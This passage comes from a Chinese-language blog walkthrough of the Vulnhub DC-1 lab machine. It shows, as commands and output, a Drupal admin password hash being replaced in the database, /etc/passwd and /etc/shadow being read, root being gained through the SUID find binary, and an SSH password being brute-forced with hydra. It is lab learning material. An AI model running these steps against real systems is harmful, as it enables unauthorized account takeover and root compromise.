|   1 | admin | $S$DjLcqu7Pury7nKFmo/PeV7DI6PIceI3t/R6DEkU7Xdg7fRQozPyt |
|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |
+-----+-------+---------------------------------------------------------+
3 rows in set (0.00 sec)</code></pre>

<p>这里的pass明显经过类似md5一类的加密方式加密过的,没有办法解密出来</p>
<p>所以我们的思路是看他是怎么加密的,然后用相同的方式去加密”pass”,然后把”pass”的加密后的密文update到数据库中,替换掉原来的密文,那么就可以用”admin”和”pass”去登陆了</p>
<h3 id="进入script目录-生成新的密码"><a href="#进入script目录-生成新的密码" class="headerlink" title="进入script目录,生成新的密码"></a>进入script目录,生成新的密码</h3><p>这里进入scripts目录看一下</p>
<blockquote>
<p>/scripts 命令行脚本 在命令行可以执行的脚本文件，包括安装脚本，数据库备份脚本等</p>
</blockquote>
<pre><code class="hljs bash">www-data@DC-1:/var/www/scripts$ ls
ls
code-clean.sh  drupal.sh            generate-d6-content.sh  password-hash.sh
cron-curl.sh   dump-database-d6.sh  generate-d7-content.sh  run-tests.sh
cron-lynx.sh   dump-database-d7.sh  includes                test.script</code></pre>

<p>此目录有个password-hash.sh,猜测是这个cms的密码加密算法</p>
<pre><code class="hljs dart">www-data<span class="hljs-meta">@DC</span><span class="hljs-number">-1</span>:/<span class="hljs-keyword">var</span>/www/scripts$ cat password-hash.sh
cat password-hash.sh
#!/usr/bin/php
&lt;?php

<span class="hljs-comment"><span class="markdown">/**
<span class="hljs-bullet"> * </span>Drupal hash script - to generate </span>a<span class="markdown"> hash from </span>a<span class="markdown"> plaintext password
<span class="hljs-bullet"> *
 </span>* Check for </span>your<span class="markdown"> PHP interpreter - on Windows </span>you<span class="markdown">'ll probably have to
<span class="hljs-bullet"> * </span>replace line 1 with
<span class="hljs-bullet"> *   </span>#!c:/program files/php/php.exe
<span class="hljs-bullet"> *
 </span>* @param password1 [password2 [password3 ...]]
<span class="hljs-bullet"> *  </span>Plain-text passwords in quotes (or with spaces backslash escaped).
 */</span></span>
文件内部分内容</code></pre>

<p>看来是的,还有使用方法</p>
<pre><code class="hljs pgsql">Generate Drupal <span class="hljs-keyword">password</span> hashes <span class="hljs-keyword">from</span> the shell.

<span class="hljs-keyword">Usage</span>:        &#123;$script&#125; [<span class="hljs-keyword">OPTIONS</span>] "&lt;plan-text password&gt;"
Example:      &#123;$script&#125; "mynewpassword"</code></pre>

<p>报错</p>
<pre><code class="hljs groovy"><span class="hljs-string">bash:</span> password-hash.<span class="hljs-string">sh:</span> command not found</code></pre>

<blockquote>
<p>linux中“.sh”文件是脚本文件，一般都是bash脚本，我们可以使用sh命令运行“sh xxx.sh”，并且由于在linux中sh是链接到bash上的，所以sh与bash在功能上是没有区别的。</p>
</blockquote>
<blockquote>
<p>程序必须以下面的行开始（必须方在文件的第一行）：<br>#!/bin/sh<br>符号#!用来告诉系统它后面的参数是用来执行该文件的程序。在这个例子中我们使用/bin/sh来执行程序。</p>
</blockquote>
<p>第一行是#!/usr/bin/php,所以再尝试生成</p>
<pre><code class="hljs elixir">www-data<span class="hljs-variable">@DC</span><span class="hljs-number">-1</span><span class="hljs-symbol">:/var/www/scripts</span><span class="hljs-variable">$ </span>php password-hash.sh <span class="hljs-string">"pass"</span>
php password-hash.sh <span class="hljs-string">"pass"</span>

<span class="hljs-symbol">password:</span> pass          <span class="hljs-symbol">hash:</span> <span class="hljs-variable">$S</span><span class="hljs-variable">$DzK49SXmGCYyrDNDBKXru0ZdwsWB8pkwBz7l0iFvElyNNvccbEK2</span></code></pre>

<h3 id="update新密码的hash"><a href="#update新密码的hash" class="headerlink" title="update新密码的hash"></a>update新密码的hash</h3><pre><code class="hljs routeros">mysql&gt; update<span class="hljs-built_in"> users </span><span class="hljs-builtin-name">set</span> <span class="hljs-attribute">pass</span>=<span class="hljs-string">"<span class="hljs-variable">$S</span><span class="hljs-variable">$DzK49SXmGCYyrDNDBKXru0ZdwsWB8pkwBz7l0iFvElyNNvccbEK2</span>"</span> where <span class="hljs-attribute">name</span>=<span class="hljs-string">"admin"</span>;
&lt;u0ZdwsWB8pkwBz7l0iFvElyNNvccbEK2<span class="hljs-string">" where name="</span>admin<span class="hljs-string">";</span></code></pre>

<h3 id="尝试登陆-flag3"><a href="#尝试登陆-flag3" class="headerlink" title="尝试登陆,flag3"></a>尝试登陆,flag3</h3><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201126121940.png" srcset="/img/loading.gif" alt=""></p>
<p>登陆成功,随便点点可以看到flag3嘻嘻嘻</p>
<p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201126183639.png" srcset="/img/loading.gif" alt=""></p>
<pre><code class="hljs python">Special PERMS will help FIND the passwd - but yo<span class="hljs-string">u'll need to -exec that command to work out how to get what'</span>s <span class="hljs-keyword">in</span> the shadow.
翻译:特殊的PERMS可以帮助找到密码-但您需要-<span class="hljs-keyword">exec</span>该命令来确定如何获取隐藏的内容。</code></pre>

<h3 id="找passwd文件"><a href="#找passwd文件" class="headerlink" title="找passwd文件"></a>找passwd文件</h3><blockquote>
<p>Linux 系统中的 /etc/passwd 文件，是系统用户配置文件，存储了系统中所有用户的基本信息，并且所有用户都可以对此文件执行读操作。</p>
</blockquote>
<pre><code class="hljs bash">www-data@DC-1:/etc$ cat passwd
cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:104::/var/spool/exim4:/bin/<span class="hljs-literal">false</span>
statd:x:102:65534::/var/lib/nfs:/bin/<span class="hljs-literal">false</span>
messagebus:x:103:107::/var/run/dbus:/bin/<span class="hljs-literal">false</span>
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/<span class="hljs-literal">false</span>
flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</code></pre>

<blockquote>
<p>用户名：密码：UID（用户ID）：GID（组ID）：描述性信息：主目录：默认Shell</p>
</blockquote>
<p>看到最后一行有个叫flag4的用户</p>
<h3 id="进入-home目录-falg4"><a href="#进入-home目录-falg4" class="headerlink" title="进入/home目录,falg4"></a>进入/home目录,falg4</h3><pre><code class="hljs elixir">www-data<span class="hljs-variable">@DC</span><span class="hljs-number">-1</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>ls
ls
flag4</code></pre>

<pre><code class="hljs oxygene">www-data@DC-<span class="hljs-number">1</span>:/home/flag4$ cat flag4.txt
cat flag4.txt
Can you use this same <span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">to</span> <span class="hljs-title">find</span> <span class="hljs-title">or</span> <span class="hljs-title">access</span> <span class="hljs-title">the</span> <span class="hljs-title">flag</span> <span class="hljs-title">in</span> <span class="hljs-title">root</span>?

<span class="hljs-title">Probably</span>. <span class="hljs-title">But</span> <span class="hljs-title">perhaps</span> <span class="hljs-title">it</span>'<span class="hljs-title">s</span> <span class="hljs-title">not</span> <span class="hljs-title">that</span> <span class="hljs-title">easy</span>.  <span class="hljs-title">Or</span> <span class="hljs-title">maybe</span> <span class="hljs-title">it</span> <span class="hljs-title">is</span>?</span></code></pre>

<p>flag4的提示说需要拿到root用户,可能还有最后一个flag</p>
<h3 id="尝试打开etc-shadow文件"><a href="#尝试打开etc-shadow文件" class="headerlink" title="尝试打开etc/shadow文件"></a>尝试打开etc/shadow文件</h3><pre><code class="hljs bash">www-data@DC-1:/etc$ cat shadow 
cat shadow
cat: shadow: Permission denied</code></pre>

<p>发现www-data用户<strong>无权限</strong>看到里面的内容</p>
<blockquote>
<p>/etc/shadow 文件只有 root 用户拥有读权限，其他用户没有任何权限，这样就保证了用户密码的安全性。</p>
</blockquote>
<p>这就和flag4的拿root的提示相同了,拿接下来的任务就是拿root权限了</p>
<h3 id="拿root权限-提权"><a href="#拿root权限-提权" class="headerlink" title="拿root权限(提权)"></a>拿root权限(提权)</h3><p>提权第一时间想到suid提权,首先查看系统上运行的所有SUID可执行文件</p>
<pre><code class="hljs bash"><span class="hljs-comment">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span>
find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null
find / -user root -perm -4000-print2&gt;/dev/null
find / -user root -perm -4000-exec ls -ldb &#123;&#125; \;</code></pre>

<pre><code class="hljs bash">www-data@DC-1:/etc$ 
find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/nullfind / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs</code></pre>

<p>利用find文件提权(只能用以下命令提权,这里只有find)</p>
<blockquote>
<ul>
<li>nmap</li>
<li>vim</li>
<li>find</li>
<li>bash</li>
<li>more</li>
<li>less</li>
<li>nano</li>
<li>cp</li>
</ul>
</blockquote>
<pre><code class="hljs bash">www-data@DC-1:/etc$ find ./ aaa -<span class="hljs-built_in">exec</span> <span class="hljs-string">'/bin/sh'</span> \;
find ./ aaa -<span class="hljs-built_in">exec</span> <span class="hljs-string">'/bin/sh'</span> \;
<span class="hljs-comment"># whoami</span>
whoami
root</code></pre>

<p>提权成功!</p>
<h3 id="finalflag"><a href="#finalflag" class="headerlink" title="finalflag"></a>finalflag</h3><pre><code class="hljs bash"><span class="hljs-comment"># cd root</span>
<span class="hljs-built_in">cd</span> root
<span class="hljs-comment"># ls</span>
ls
thefinalflag.txt
<span class="hljs-comment"># cat thefinalflag.txt</span>
cat thefinalflag.txt
Well <span class="hljs-keyword">done</span>!!!!

Hopefully you<span class="hljs-string">'ve enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7</span></code></pre>

<h2 id="方法2-22端口"><a href="#方法2-22端口" class="headerlink" title="方法2(22端口)"></a>方法2(22端口)</h2><p>在知道有个用户flag4之后，也可以从22端口入手。现在是知道了ssh的用户名flag4，但是密码不知道</p>
<p>可以尝试穷举密码</p>
<h3 id="hydra穷举密码"><a href="#hydra穷举密码" class="headerlink" title="hydra穷举密码"></a>hydra穷举密码</h3><p>字典是kali自带的字典，-vV是详细信息，-f是找到就停止。密码是orange</p>
<pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.104 -vV -f</span></code></pre>

<pre><code class="hljs bash">[22][ssh] host: 192.168.56.104   login: flag4   password: orange
[STATUS] attack finished <span class="hljs-keyword">for</span> 192.168.56.104 (valid pair found)
1 of 1 target successfully completed, 1 valid password found</code></pre>

<h3 id="ssh登陆"><a href="#ssh登陆" class="headerlink" title="ssh登陆"></a>ssh登陆</h3><pre><code class="hljs yaml"><span class="hljs-string">root@kali:~#</span> <span class="hljs-string">ssh</span> <span class="hljs-string">flag4@192.168.56.104</span>
<span class="hljs-attr">Warning:</span> <span class="hljs-string">Permanently</span> <span class="hljs-string">added</span> <span class="hljs-string">'192.168.56.104'</span> <span class="hljs-string">(ECDSA)</span> <span class="hljs-string">to</span> <span class="hljs-string">the</span> <span class="hljs-string">list</span> <span class="hljs-string">of</span> <span class="hljs-string">known</span> <span class="hljs-string">hosts.</span>
<span class="hljs-string">flag4@192.168.56.104's</span> <span class="hljs-attr">password:</span> 
<span class="hljs-string">Linux</span> <span class="hljs-string">DC-1</span> <span class="hljs-number">3.2</span><span class="hljs-number">.0</span><span class="hljs-number">-6</span><span class="hljs-number">-486</span> <span class="hljs-comment">#1 Debian 3.2.102-1 i686</span>

<span class="hljs-string">The</span> <span class="hljs-string">programs</span> <span class="hljs-string">included</span> <span class="hljs-string">with</span> <span class="hljs-string">the</span> <span class="hljs-string">Debian</span> <span class="hljs-string">GNU/Linux</span> <span class="hljs-string">system</span> <span class="hljs-string">are</span> <span class="hljs-string">free</span> <span class="hljs-string">software;</span>
<span class="hljs-string">the</span> <span class="hljs-string">exact</span> <span class="hljs-string">distribution</span> <span class="hljs-string">terms</span> <span class="hljs-string">for</span> <span class="hljs-string">each</span> <span class="hljs-string">program</span> <span class="hljs-string">are</span> <span class="hljs-string">described</span> <span class="hljs-string">in</span> <span class="hljs-string">the</span>
<span class="hljs-string">individual</span> <span class="hljs-string">files</span> <span class="hljs-string">in</span> <span class="hljs-string">/usr/share/doc/*/copyright.</span>

<span class="hljs-string">Debian</span> <span class="hljs-string">GNU/Linux</span> <span class="hljs-string">comes</span> <span class="hljs-string">with</span> <span class="hljs-string">ABSOLUTELY</span> <span class="hljs-literal">NO</span> <span class="hljs-string">WARRANTY,</span> <span class="hljs-string">to</span> <span class="hljs-string">the</span> <span class="hljs-string">extent</span>
<span class="hljs-string">permitted</span> <span class="hljs-string">by</span> <span class="hljs-string">applicable</span> <span class="hljs-string">law.</span>
<span class="hljs-attr">Last login:</span> <span class="hljs-string">Fri</span> <span class="hljs-string">Nov</span> <span class="hljs-number">20</span> <span class="hljs-number">20</span><span class="hljs-string">:42:09</span> <span class="hljs-number">2020</span> <span class="hljs-string">from</span> <span class="hljs-number">192.168</span><span class="hljs-number">.137</span><span class="hljs-number">.130</span>
<span class="hljs-string">flag4@DC-1:~$</span></code></pre>

<p>接下来的思路就是一样的了</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>知识点总结：</p>
<ul>
<li>nmap扫描</li>
<li>whatweb扫描cms</li>
<li>msfconsole的使用</li>
<li>python转换交互式tty</li>
<li>suid提权</li>
<li>hydra穷举ssh密码</li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/11/05/%E6%8A%80%E6%9C%AF%E5%90%8D%E8%AF%8D%E5%B7%A5%E5%85%B7%E7%99%BE%E7%A7%91%E9%A1%B5%E9%9D%A2/">
                        <span class="hidden-mobile">技术名词工具百科页面</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>







  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "Vulnhub DC-1 Writeup&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>




















</body>
</html>
